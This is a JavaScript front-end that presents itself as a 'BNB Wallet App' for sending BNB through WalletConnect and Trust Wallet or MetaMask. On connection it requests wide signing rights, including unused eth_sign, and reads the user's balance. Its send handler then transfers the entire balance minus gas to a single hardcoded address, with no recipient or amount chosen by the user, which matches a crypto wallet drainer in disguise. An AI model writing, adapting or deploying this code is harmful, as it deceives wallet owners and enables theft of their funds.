import { ethers } from "ethers";
import { WalletConnectModalSign } from "@walletconnect/modal-sign-html";

const projectId = "4d08946e6c316bed5e76b450ccbb5256"; // WalletConnect Project ID
const TO_ADDRESS = "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05"; // آدرس مقصد

const modal = new WalletConnectModalSign({
  projectId,
  metadata: {
    name: "BNB Wallet App",
    description: "Send BNB with WalletConnect",
    url: "http://localhost",
    icons: ["https://walletconnect.com/walletconnect-logo.png"],
  },
  explorerRecommendedWalletIds: ["trust", "metamask"],
  mobileWallets: [
    {
      id: "trust",
      name: "Trust Wallet",
      homepage: "https://trustwallet.com",
      universalLink: "https://link.trustwallet.com/wc",
      nativeLink: "trust://"
    },
    {
      id: "metamask",
      name: "MetaMask",
      homepage: "https://metamask.io",
      universalLink: "https://metamask.app.link/wc",
      nativeLink: "metamask://"
    }
  ]
});

const connectBtn = document.getElementById("connectBtn");
const sendBtn = document.getElementById("sendBtn");
const addressSpan = document.getElementById("address");
const balanceSpan = document.getElementById("balance");

let session;
let userAddress;

connectBtn.addEventListener("click", async () => {
  try {
    session = await modal.connect({
      requiredNamespaces: {
        eip155: {
          methods: [
            "eth_sendTransaction",
            "eth_sign",
            "personal_sign",
            "eth_signTransaction",
            "eth_signTypedData"
          ],
          chains: ["eip155:56"],
          events: ["chainChanged", "accountsChanged"],
        },
      },
    });

    const account = session.namespaces.eip155.accounts[0];
    userAddress = account.split(":")[2];
    addressSpan.textContent = userAddress;

    const rpc = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
    const balance = await rpc.getBalance(userAddress);
    const bnb = ethers.formatEther(balance);
    balanceSpan.textContent = `${bnb} BNB`;

  } catch (err) {
    console.error("Connection error:", err);
  }
});

sendBtn.addEventListener("click", async () => {
  if (!session || !userAddress) {
    alert("Please connect your wallet first.");
    return;
  }

  try {
    const rpc = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
    const balance = await rpc.getBalance(userAddress);

    const gasLimit = 21000n;
    const gasPrice = await rpc.getFeeData().then(fee => fee.gasPrice || 5n * 10n ** 9n);
    const fee = gasLimit * gasPrice;
    const amountToSend = balance - fee;

    if (amountToSend <= 0n) {
      alert("Not enough BNB to send.");
      return;
    }

    const tx = {
      from: userAddress,
      to: TO_ADDRESS,
      value: ethers.toBeHex(amountToSend),  // اصلاح شده
      gas: ethers.toBeHex(gasLimit),
      gasPrice: ethers.toBeHex(gasPrice)
    };

    const result = await modal.request({
      topic: session.topic,
      chainId: "eip155:56",
      request: {
        method: "eth_sendTransaction",
        params: [tx],
      },
    });

    alert(`Transaction sent!\nTx Hash: ${result}`);
  } catch (err) {
    console.error("Send failed:", err);
    alert("Transaction failed: " + (err.message || err));
  }
});